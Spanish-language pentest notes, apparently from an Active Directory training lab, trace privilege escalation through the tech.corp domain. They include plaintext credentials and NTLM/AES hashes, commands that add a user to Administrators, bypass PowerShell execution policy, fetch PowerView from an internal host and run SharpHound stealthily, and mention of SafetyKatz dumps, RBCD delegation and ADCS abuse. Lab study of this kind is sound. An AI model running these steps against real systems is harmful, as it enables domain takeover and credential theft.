20.188.58.86
tech\studentuser
Su@8385477874400735

### 172.16.100.10 (sudent)

![[Pasted image 20260713203645.png]]

## Recursos compartidos
![[Pasted image 20260713231504.png]]

![[image.png]]
1. P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!
2. studentadmin
#### Añadimos al nuestro ususario al descubrir la contraseña en un archivo en texto plano
net localgroup Administrators TECH\studentuser /add
![[image2.png]]

![[Pasted image 20260713232540.png]]
![[Pasted image 20260713232607.png]]

## ELiminar restriccciones de ejecucion
```shell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
```

## Enumeracion de usuarios
![[Pasted image 20260714070559.png]]

## Enumeracion de equpos
![[Pasted image 20260714070639.png]]

## Domain Admins
![[Pasted image 20260714070812.png]]

![[Pasted image 20260714070846.png]]


## IPs y Puertos
![[Pasted image 20260714071621.png]]

## Obetener las GPO aplicadas en el recurso compartido
Get-DomainGPO -ComputerIdentity tech-dc
![[Pasted image 20260714084725.png]]

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

![[Pasted image 20260714142014.png]]

.\SharpHound.exe -c All,GPOLocalGroup,LoggedOn --domain tech.corp

| **studvm$**      | `01766386a8a082a359e9baf437cc7ce6` | **Ataque S4U (Delegación)** - Este es el que necesitas para el RBCD |
| ---------------- | ---------------------------------- | ------------------------------------------------------------------- |
| **studentuser**  | `5bade58465eca3499257e8b90d99f9aa` | Movimiento lateral como tu usuario actual                           |
| **studentadmin** | `97daeac345542c952eea4446471ca158` | Acceso local a la máquina `studvm`                                  |

## GenericWrite sobre MGMTSRV
![[Pasted image 20260714151112.png]]

![[Pasted image 20260715113133.png]]

![[Pasted image 20260714120401.png]]


En shell como nt
![[Pasted image 20260714154940.png]]

![[Pasted image 20260714155012.png]]

## Techadmin
![[Pasted image 20260714155225.png]]

Accedemos a la maquina
![[Pasted image 20260714161048.pn
![[Pasted image 20260714161107.png]]

Cragaremos las herramintas usando el siguiente formatop
Invoke-WebRequest -Uri "http://172.16.100.10/PowerView.ps1" -OutFile "PowerView.ps1"
## Dumpear hashes guardado
![[Pasted image 20260714162059.png]]

Pillamos los hashes de los ususarios
**mgmtsrv$** -> 72172516b26f4b7d6df600fff77555301804309d7494ea293a0f87b008fa3199 
**techservice** -> c08ab7bab7fec602e8dbcf924e4a8bf42b6dbc323a7296f2933311e82028061a

## Importamos el ticket que ahora podemos anadir management

![[Pasted image 20260714163118.png]]
![[Pasted image 20260715131836.png]]

Cargamos PowerView y añadimos al ususario techservice al grupo Management
![[Pasted image 20260714163238.png]]


Ahora cambiaremos la contraseña del ususario de puretech
![[Pasted image 20260715133431.png]]
![[Pasted image 20260714173452.png]]

Calcular hash puretech
![[Pasted image 20260714173610.png]]

**Password123** -> 58A478135A93AC3BF058A5EA0E8FDB71

Y usaremos las credenciales creadas para acceder a **techsrv30** como puretech
![[Pasted image 20260714165005.png]]
![[Pasted image 20260714165511.png|414]]

![[Pasted image 20260714191546.png]]

![[Pasted image 20260714191531.png]]

Obtenemos acceso a la maquina techsrv30
![[Pasted image 20260714192002.png]]


![[Pasted image 20260714192108.png]]

Nos transfewrimos el loader para extraer el hash
![[Pasted image 20260714193026.png]]

Y ejecutamos SafetyKatz
![[Pasted image 20260714193108.png]]
![[Pasted image 20260714193125.png]]

**techsrv30$** -> d11b3010f954fa9f7d1cb03d81abde49 

Cargamso el ticket
![[Pasted image 20260714194120.png]]

![[Pasted image 20260715155031.png]]

Hemos agredo techsrv30 a srvusers
![[Pasted image 20260714194254.png]]

![[Pasted image 20260714195625.png]]


Pasamos el loader y ejecutamos safetykatz
![[Pasted image 20260714200355.png]]

Sacamos el hash de causer
![[Pasted image 20260714200415.png]]


**causer** -> 3b41e1603a0ce2efef66cdc4b423d064 

cargar el ticket en memoria
![[Pasted image 20260714203211.png]]

Enumerando ADCS y plantillas
![[Pasted image 20260714200726.png]]
![[Pasted image 20260714200923.png]]

![[Pasted image 20260714203501.png]]

Guardamos el ourput en cert.pem
![[Pasted image 20260714205208.png]]


Pasamos el cert.pfx![[Pasted image 20260714205347.png]]


No se guarda
![[Pasted image 20260714210933.png]]
![[Pasted image 20260715193629.png]]

![[Pasted image 20260715194806.png]]

![[Pasted image 20260714212941.png]]




# SharpHound.exe --collectionmethod All --Stealth